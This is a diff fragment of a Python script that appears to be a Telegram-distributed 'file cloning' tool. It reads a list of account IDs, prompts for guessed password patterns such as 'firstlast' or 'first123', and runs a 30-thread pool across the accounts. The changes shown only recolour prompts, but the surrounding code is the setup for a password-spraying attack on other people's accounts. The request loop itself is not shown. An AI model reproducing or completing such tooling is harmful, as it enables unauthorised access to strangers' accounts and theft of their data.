@@ -40,26 +40,26 @@ logo = f'''\n
 #-----------------------[ MAIN MENU ]-----------------------#
 def mrpoco():
 	os.system('xdg-open https://t.me/MR_POCO_143')
-	clear();print(f'\x1b[1;94m{xd1} START FILE CLONING ');print(f'\x1b[1;94m{xd0} EXIT FILE CLONING ');linex();mr=input(f'{xdx} SELECT : ')
+	clear();print(f'{xd1} \x1b[1;34m FILE CLONING ');print(f'{xd0} \x1b[1;34mEXIT FILE CLONING ');linex();mr=input(f'{xdx} SELECT : ')
 	if mr in ["1"]:__________filex__________()
 	elif mr in ["0"]:exit()
 	else:linex();print(f'{xd} OPTION NOT FOUND ');linex();time.sleep(1);print(f"{xd} TRY AGAIN ");time.sleep(1);mrpoco()
 #-----------------------[ FILE MENU ]-----------------------#
 def __________filex__________():
 	os.system('xdg-open https://t.me/MR_POCO_143')
-	clear();print(f'{xd} EXAMPLE : /sdcard/filename.txt ');linex();file = input(f'{xdx} ENTER FILE PATH : ')
+	clear();print(f'{xd} \x1b[1;34mEXAMPLE : /sdcard/filename.txt ');linex();file = input(f'{xdx} \x1b[1;34mENTER FILE PATH : ')
 	try:
 		fo = open(file,'r').read().splitlines()
 	except FileNotFoundError:
 		print(f'{xd} OPTION NOT FOUND ');linex();time.sleep(1);print(f"{xd} TRY AGAIN ");time.sleep(1);__________filex__________()
 	clear()
 	try:
-		ps_limit = int(input(f'{xdx} ENTER PASSWORD LIMIT : '))
+		ps_limit = int(input(f'{xdx} \x1b[1;34mENTER PASSWORD LIMIT : '))
 	except:
 		ps_limit = 5
-	clear();print(f'{xd} EXAMPLE : firstlast | firtslast | first123');linex()
+	clear();print(f'{xd} \x1b[1;34mEXAMPLE : firstlast | firtslast | first123');linex()
 	for i in range(ps_limit):
-		plist.append(input(f'{xd} ENTER PASSWORD {W}[{G}{i+1}{W}] : '))
+		plist.append(input(f'{xd} \x1b[1;34mENTER PASSWORD {W}[{G}{i+1}{W}] : '))
 	with tred(max_workers=30) as __________mrpoco__________:
 		clear();__________totaluid__________ = str(len(fo))
 		print(f'{G} TOTAL ACCOUNTS :{R} {__________totaluid__________} ')
